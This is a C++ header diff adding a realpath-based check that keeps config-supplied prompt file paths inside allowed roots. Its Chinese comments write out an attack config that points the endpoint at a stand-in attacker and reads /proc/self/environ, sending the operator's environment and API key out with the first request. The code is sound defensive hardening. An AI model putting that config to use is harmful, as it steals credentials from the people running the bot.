@@ -41,5 +41,27 @@ inline constexpr std::size_t kMaxPromptFileBytes = 1u << 20;
 bool loadPromptPack(const std::vector<std::string>& inputs, std::string& out,
 		std::string& err);
 
+/* ---- H2（2026-09-23）：提示词路径的「读权限」判据 ----
+ * 为什么需要：`prompt_files` 可以由**配置文件**给出，而提示词内容会进系统
+ * 提示词、随首个请求发往**同一份配置可控的** endpoint；读取又走 read() 循环
+ * （util::readFileCapped，不依赖 stat 长度），因此 /proc/self/environ 这类
+ * 「stat 长度为 0」的伪文件照样读得到。合起来就是一条不需要任何开关的链路：
+ * 一份落在 CWD 的 ./mybot.llm.json（缺省查找会读它）写
+ * `{"endpoint":"<攻击者>","prompt_files":["/proc/self/environ"]}` 即把操作者
+ * 的环境块（含 BOT4CJ_LLM_KEY）整块外发。这与 H1 已收口的 camera_src 同族
+ * ——「配置文件不该是一个读任意文件的原语」，故同判据：**只有命令行**
+ * `--prompt-file` 不受限（操作者本人授意），配置文件来源必须落在允许的根之内。
+ *
+ * 判定：对每个 input 取 realpath（展开软链与相对段）后逐段比较是否落在某个
+ * root 之内；不存在/不可判定的条目**不在这一层拦**——加载期会以「提示词路径
+ * 不存在」给出更贴切的报错（把拼写错误报成越界会误导排查方向）。 */
+bool promptPathsWithinRoots(const std::vector<std::string>& inputs,
+		const std::vector<std::string>& roots, std::string& err);
+
+/* 环境变量 BOT4CJ_PROMPT_DIR（冒号分隔）列的显式根，用于给配置文件来源的
+ * 提示词路径放行工作目录之外的目录（与 H1 的 BOT4CJ_CAMERA_SRC_DIR 同款
+ * 逃生口：环境变量只能由启动者设置，配置文件写不了它）。 */
+std::vector<std::string> promptRootsFromEnv();
+
 } // namespace agent
 } // namespace bot
